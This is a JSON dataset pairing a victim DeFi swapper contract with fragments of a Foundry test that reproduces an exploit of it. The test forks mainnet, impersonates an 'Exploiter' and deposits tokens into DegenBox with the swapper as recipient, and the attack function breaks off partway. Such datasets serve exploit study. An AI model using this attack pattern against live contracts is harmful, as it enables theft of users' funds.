[
  {
    "contract/interface": "IDegenBox",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "    function deposit(\n        IERC20 token_,\n        address from,\n        address to,\n        uint256 amount,\n        uint256 share\n    ) external payable returns (uint256 amountOut, uint256 shareOut);\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISwapper",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "    function swap(\n        address,\n        address,\n        address recipient,\n        uint256 shareToMin,\n        uint256 shareFrom,\n        bytes calldata swapData\n    ) public override returns (uint256 extraShare, uint256 shareReturned) {\n        bentoBox.withdraw(IERC20(address(pool)), address(this), address(this), 0, shareFrom);\n\n        // use the full balance so it's easier to check if everything has been redeemed.\n        uint256 amount = IERC20(address(pool)).balanceOf(address(this));\n\n        // Stargate Pool LP -> Underlying Token\n        stargateRouter.instantRedeemLocal(poolId, amount, address(this));\n        require(IERC20(address(pool)).balanceOf(address(this)) == 0, \"Cannot fully redeem\");\n\n        // underlying -> MIM\n        (bool success, ) = zeroXExchangeProxy.call(swapData);\n        if (!success) {\n            revert ErrSwapFailed();\n        }\n\n        (, shareReturned) = bentoBox.deposit(mim, address(this), recipient, mim.balanceOf(address(this)), 0);\n        extraShare = shareReturned - shareToMin;\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "MIMTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "MIMTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MIMTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MIMTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MIMTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "MIMTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 17_521_638);\n        deal(address(SUSDT), exploiter, 3e6);\n        cheats.startPrank(exploiter);\n        SUSDT.approve(address(this), type(uint256).max);\n        cheats.stopPrank();\n        cheats.label(address(SUSDT), \"SUSDT\");\n        cheats.label(address(MIM), \"MIM\");\n        cheats.label(address(DegenBox), \"DegenBox\");\n        cheats.label(address(ZeroXStargateLPSwapper), \"ZeroXStargateLPSwapper\");\n        cheats.label(curveLiquidityProvider, \"CurveLiquidityProvider\");\n        cheats.label(exploiter, \"Exploiter\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MIMTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MIMTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MIMTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MIMTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "MIMTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MIMTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "MIMTest",
    "source_type": "attacker_contract",
    "function_name": "testTransaction",
    "original_code": "    function testTransaction() public {\n        emit log_named_decimal_uint(\n            \"Exploiter's amount of MIM tokens before attack\", MIM.balanceOf(exploiter), MIM.decimals()\n        );\n\n        SUSDT.transferFrom(exploiter, address(this), 3e6);\n        SUSDT.approve(address(DegenBox), type(uint256).max);\n        DegenBox.deposit(address(SUSDT), address(this), address(ZeroXStargateLPSwapper), 0, 2_400_000);\n\n",
    "description": ""
  }
]